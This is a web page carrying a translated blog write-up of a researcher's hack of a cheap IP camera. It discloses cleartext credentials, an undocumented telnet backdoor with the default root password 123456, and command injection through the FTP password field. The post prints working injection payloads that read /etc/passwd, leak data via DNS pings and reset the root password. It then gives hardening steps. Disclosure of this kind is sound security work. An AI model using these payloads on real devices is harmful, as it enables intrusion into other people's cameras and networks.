<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How I hacked my ip camera and found a backdoor there</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The time has come. I bought myself a second IoT device in the form of a cheap ip camera. My expectations regarding the security of this camera were no...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How I hacked my ip camera and found a backdoor there</h1><div class="post__text post__text-html js-mediator-article">  The time has come.  I bought myself a second IoT device in the form of a cheap ip camera.  My expectations regarding the security of this camera were not high, it was the cheapest camera of all.  But she was able to surprise me. <br><div style="text-align:center;"><img src="https://habrastorage.org/files/141/2f9/dd3/1412f9dd3e80488d84b0eac2c138e009.png"></div><br><a name="habracut"></a><br>  I opened the box, and the first thing I saw was a 4-digit password.  This is the password of the ‚ÄúAdministrator‚Äù user to configure the device.  See the video below.  Most people don't care about changing this password. <br><br>  Obviously, this camera can communicate via Ethernet cable or Wi-Fi.  Pleased with WPA2 support, however, people tend to leave Wi-Fi unprotected. <br><br>  Having intercepted the traffic between the camera and the desktop application, it is easy to notice that the data is transmitted via HTTP via port 81.  Just brilliant session management.  The username and password are transmitted in each GET request, without encryption.  Wi-Fi though was protected. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Fortunately, the desktop application saves for you the password in clear text in the file: <br><br><pre><code class="hljs tex">"C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Users</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">&lt;</span></span></span></span>USER&gt;<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AppData</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Local</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">VirtualStore</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Program</span></span></span></span> Files (x86)<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">&lt;</span></span></span></span>REDACTED&gt;<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span></span>.dat"</code> </pre> <br>  This wonderful camera accesses the cloud via UDP.  Servers are located in Hong Kong and China.  If you are not interested in why the ip-camera is connected to the cloud, then everything is simple.  This camera is able to interact with mobile applications for Android and IOS.  And users connect to the cloud, so as not to bother with setting up ports and DNS.  Super. <br><br>  Let's set nmap on this device. <br><br><pre> <code class="hljs pgsql">PORT STATE SERVICE <span class="hljs-keyword"><span class="hljs-keyword">VERSION</span></span> <span class="hljs-number"><span class="hljs-number">23</span></span>/tcp <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> telnet BusyBox telnetd <span class="hljs-number"><span class="hljs-number">81</span></span>/tcp <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> http GoAhead-Webs httpd | http-auth: | HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> <span class="hljs-number"><span class="hljs-number">401</span></span> Unauthorized |_ Digest algorithm=MD5 <span class="hljs-type"><span class="hljs-type">opaque</span></span>=<span class="hljs-number"><span class="hljs-number">5</span></span>ccc069c403ebaf9f0171e9517f40e41 qop=auth realm=GoAhead stale=<span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> nonce=<span class="hljs-number"><span class="hljs-number">99</span></span>ff3efe612fa44cdc028c963765867b <span class="hljs-keyword"><span class="hljs-keyword">domain</span></span>=:<span class="hljs-number"><span class="hljs-number">81</span></span> |_http-methods: <span class="hljs-keyword"><span class="hljs-keyword">No</span></span> Allow <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">header</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OPTIONS</span></span> response (status code <span class="hljs-number"><span class="hljs-number">400</span></span>) |_http-title: Document Error: Unauthorized <span class="hljs-number"><span class="hljs-number">8600</span></span>/tcp <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> tcpwrapped</code> </pre> <br>  An HTTP server, a Telnet server on BusyBox, and some port 8600 were identified. In the 27-page manual, not a word about Telnet is said.  How do we call this port?  Debug port?  Or backdoor port?  We'll see.  I manually tried several passwords for the root user, but none of them worked.  I moved on. <br><br><h4>  Double Blind Injection </h4><br>  An IP camera can upload snapshots to an FTP server.  However, this option requires pre-configuration.  When I set it up, it turned out that it was not working.  The username and password from the server were not correct.  After some debugging it turned out that the problem was that my password contained the $ symbol.  And I started digging.  I was sure that this vulnerability allows you to insert commands, but did not know how to use it.  There were numerous problems complicating the operation.  I call this vulnerability a double blind injection.  Firstly, we do not see the output of this command, and secondly, its execution occurs in another thread.  Thus, the use of sleep does not lead to anything. <br><br>  But the third problem was the worst of all - a limit of 32 characters.  I could send some information via DNS.  And using the following commands, I could get the current directory: <br><br><pre> <code class="bash hljs">$(ping%20-c%202%20%60pwd%60)</code> </pre> <br>  Or the same command in a readable form: <br><br><pre> <code class="bash hljs">$(ping -c 2 `<span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span>`)</code> </pre> <br>  but I could not get the information out of / etc / passwd.  I tried to perform $ (reboot), but it was a very bad idea, and the camera went into an endless reboot, and the hardware reset buttons did not work.  Happy times. <br><br>  Below are my desperate attempts to access the shell.  Thanks to EQ for his help in the nightly hacking process.  And for his great ideas. <br><br><pre> <code class="bash hljs">$(cp /etc/passwd /tmp/a) ;copy /etc/passwd to a file <span class="hljs-built_in"><span class="hljs-built_in">which</span></span> has a shorter name $(cat /tmp/a|head -1&gt;/tmp/b) ;filter <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> the first row $(cat&lt;/tmp/b|tr -d <span class="hljs-string"><span class="hljs-string">' '</span></span>&gt;/tmp/c) ;filter out unwanted characters $(ping `cat /tmp/c`) ;leak it via DNS</code> </pre> <br>  After I finally hacked the camera, the following problem arose.  There were no commands head, tr, less, more or cut.  It was not nc and even bash was not ... <br><br>  I even tried to use <a href="https://github.com/stasinopoulos/commix">commix</a> , from the video on <a href="https://www.youtube.com/watch%3Ft%3D297%26v%3DaVTGqiyVz5o">Youtube</a> he showed great promise.  Commix is ‚Äã‚Äãsimilar to sqlmap, but only for command injection.  However, this case was too complicated for him. <br><br><img src="https://habrastorage.org/files/ada/dad/e6e/adadade6e283413faf95bc00989f1f30.png"><br><br>  After numerous failed attempts, I finally found the password.  Sesame open up. <br><br><pre> <code class="bash hljs">$(<span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">'root:passwd'</span></span>|chpasswd)</code> </pre> <br>  Login with telnet <br><br><pre> <code class="hljs pgsql">(<span class="hljs-keyword"><span class="hljs-keyword">none</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">login</span></span>: root <span class="hljs-keyword"><span class="hljs-keyword">Password</span></span>: BusyBox v1<span class="hljs-number"><span class="hljs-number">.12</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span> (<span class="hljs-number"><span class="hljs-number">2012</span></span><span class="hljs-number"><span class="hljs-number">-11</span></span><span class="hljs-number"><span class="hljs-number">-16</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> CST) built-<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> shell (ash) Enter <span class="hljs-string"><span class="hljs-string">'help'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> a list <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> built-<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> commands. #</code> </pre> <br>  Wow wow :) I quickly found a place where my team was injected: <br><br><pre> <code class="hljs pgsql"># cat /tmp/ftpupdate.sh /<span class="hljs-keyword"><span class="hljs-keyword">system</span></span>/<span class="hljs-keyword"><span class="hljs-keyword">system</span></span>/bin/ftp -n&lt;&lt;! <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> ftp.site.com <span class="hljs-number"><span class="hljs-number">21</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> ftpuser $(echo <span class="hljs-string"><span class="hljs-string">'root:passwd'</span></span>|chpasswd) binary mkdir PSD<span class="hljs-number"><span class="hljs-number">-111111</span></span>-REDACT cd PSD<span class="hljs-number"><span class="hljs-number">-111111</span></span>-REDACT lcd /tmp put <span class="hljs-number"><span class="hljs-number">12.</span></span>jpg <span class="hljs-number"><span class="hljs-number">00</span></span>_XX_XX_XX_XX_CA_PSD<span class="hljs-number"><span class="hljs-number">-111111</span></span>-REDACT_0_20150926150327_2.jpg <span class="hljs-keyword"><span class="hljs-keyword">close</span></span> bye</code> </pre><br>  Whenever we enter a command in the password field, it is copied to this script, which is then executed.  After that, I was afraid that I forgot to save the contents of / etc / passwd, because I was going to crack the default password on telnet as well.  Fortunately, the reboot restored the original data. <br><br><pre> <code class="hljs ruby"><span class="hljs-symbol"><span class="hljs-symbol">root:</span></span><span class="hljs-symbol"><span class="hljs-symbol">LSiuY7pOmZG2s:</span></span><span class="hljs-number"><span class="hljs-number">0</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">0</span></span><span class="hljs-symbol"><span class="hljs-symbol">:Administrator</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/bin/sh</span></span></code> </pre> <br>  Unfortunately, it was not necessary to run the good old John The Ripper, as Google suggested that this is the password hash 123456. This is much safer than the <a href="https://www.youtube.com/watch%3Fv%3Da6iW-8xPw3k">luggage password</a> . <br><br><img src="https://habrastorage.org/files/a7e/a7b/cb2/a7ea7bcb21004ee08174f5490f1e8595.png"><br><br>  It's time to recapitulate what we have.  <b><u>There is an undocumented telnet port of the IP camera, with a password: 123456 for the root user, there is no GUI to change this password, and if you change it using the console, it will return after the next reboot.</u></b>  <b><u>I think it can be called a backdoor.</u></b> <br><br>  Using root access to the console, we can get the password for the FTP server, the SMTP server (for alerts), the WiFi password (although we probably already have it), access to the administrative interface of the camera, or we can simply reconfigure the camera as we want .  Fortunately, most often this Telnet port is behind NAT or a firewall, so it is not accessible from the Internet.  But there are always exceptions.  Fortunately, UPNP does not allow you to configure the Telnet port so that it is accessible from the Internet, only the HTTP camera port 81. You are protected only by the 4-digit password, which is the default. <br><br>  And last, everything works as root, which is not surprising. <br><br><h4>  My changelog </h4><br>  I added these lines to the end of the /system/init/ipcam.sh file: <br><br><pre> <code class="bash hljs">sleep 15 <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">'root:CorrectHorseBatteryRedStaple'</span></span>|chpasswd</code> </pre> <br>  In addition, if you want, you can disable the telnet service by commenting out Telnetd in /system/init/ipcam.sh. <br><br>  If you want, disable the connection to the cloud (you can not use mobile applications), put the following command at the beginning of the /system/init/ipcam.sh file <br><br><pre> <code class="bash hljs">iptables -A OUTPUT -p udp ! --dport 53 -j DROP</code> </pre> <br>  You can use OpenVPN to connect to your home network to access the web interface of the camera.  It works with Android, IOS, and any desktop OS. <br><br>  99% of people who buy these IP cameras think they will be safe with it.  Now I understand the sticker that comes with the IP camera. <br><br><img src="https://habrastorage.org/files/271/218/7ee/2712187eedb447daaf1adfe45eb3e822.jpg"><br><br>  So, when you see in the next episode of Mr Robot how someone connected to the ip-camera via Telnet with root: 123456, you will know that this is a sad reality. </div><p>Source: <a href="https://habr.com/ru/post/316296/">https://habr.com/ru/post/316296/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../316284/index.html">NASA's Hyperwall System Now Uses Storage System vFlash</a></li>
<li><a href="../316286/index.html">‚ÄúA bit about platforms‚Äù: The future of AIaaS</a></li>
<li><a href="../316290/index.html">"New Year's Eve Shopping": VMware acquired PLNgrid SDN startup</a></li>
<li><a href="../316292/index.html">"No tricks": A little thought on the topic of API</a></li>
<li><a href="../316294/index.html">An exciting life story of how we improved service, with a tie, climax and deep morality.</a></li>
<li><a href="../316298/index.html">How they wrote their first game and what mistakes could have been avoided. Part 1. Idea</a></li>
<li><a href="../316300/index.html">RamQA # 06 - November 29 at 19:00</a></li>
<li><a href="../316302/index.html">Automate the publication of the application on Google Play - directly from Android Studio</a></li>
<li><a href="../316304/index.html">How to make PostgreSQL read faster</a></li>
<li><a href="../316306/index.html">[Peter, Announcement] Meeting JUG.ru with Andrei Ershov: ‚ÄúHow we made a phone platform using GridGain‚Äù</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>